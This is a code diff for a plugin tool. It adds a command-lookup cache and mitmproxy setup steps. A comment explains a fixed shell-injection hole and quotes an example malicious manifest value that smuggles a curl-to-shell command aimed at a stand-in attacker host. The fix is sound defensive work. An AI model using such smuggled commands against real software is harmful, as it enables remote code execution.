@@ -186,7 +186,16 @@ function shellRcFor(plugin: PluginManifest): string {
   return process.env.SHELL?.includes('zsh') ? '.zshrc' : '.bashrc'
 }
 
+// Per-command lookup cache.  `where.exe` on Windows costs 70-300ms per call
+// (PATH walk + PATHEXT expansion), and the answer virtually never changes
+// during a session.  Cache indefinitely; `invalidateCommandCache()` resets
+// after an install/uninstall so the next `detectHooks()` re-probes.
+const _cmdCache = new Map<string, boolean>()
+export function invalidateCommandCache(): void { _cmdCache.clear() }
+
 function commandExists(cmd: string): boolean {
+  const hit = _cmdCache.get(cmd)
+  if (hit !== undefined) return hit
   // v0.6.93 P0-B: was `execSync(`which ${cmd}`)` — the plugin manifest's
   // `requires[]` string flows into a shell, so a malicious manifest like
   // `requires: ["nmap; curl attacker/x | sh #"]` executes arbitrary shell.
@@ -195,8 +204,11 @@ function commandExists(cmd: string): boolean {
   try {
     const probeCmd = process.platform === 'win32' ? 'where' : 'which'
     const result = spawnSync(probeCmd, [cmd], { stdio: 'ignore' })
-    return result.status === 0
+    const found = result.status === 0
+    _cmdCache.set(cmd, found)
+    return found
   } catch {
+    _cmdCache.set(cmd, false)
     return false
   }
 }
@@ -267,6 +279,18 @@ function buildManualSteps(pluginId: string, hookFile: string): ManualStep[] | un
   switch (pluginId) {
     case 'mitmproxy':
       return [
+        {
+          label: 'Install mitmproxy (skip if already installed)',
+          command: 'pip install mitmproxy'
+        },
+        {
+          label: process.platform === 'win32'
+            ? 'Ensure the pip Scripts directory is in your PATH (restart terminal after running this)'
+            : 'Verify mitmdump is on your PATH',
+          command: process.platform === 'win32'
+            ? 'python -c "import sysconfig; print(sysconfig.get_path(\'scripts\'))"'
+            : 'which mitmdump'
+        },
         {
           label: 'Start mitmproxy with the RedLog addon (keep it running during the engagement)',
           command: `mitmdump -s "${hookFile}"`
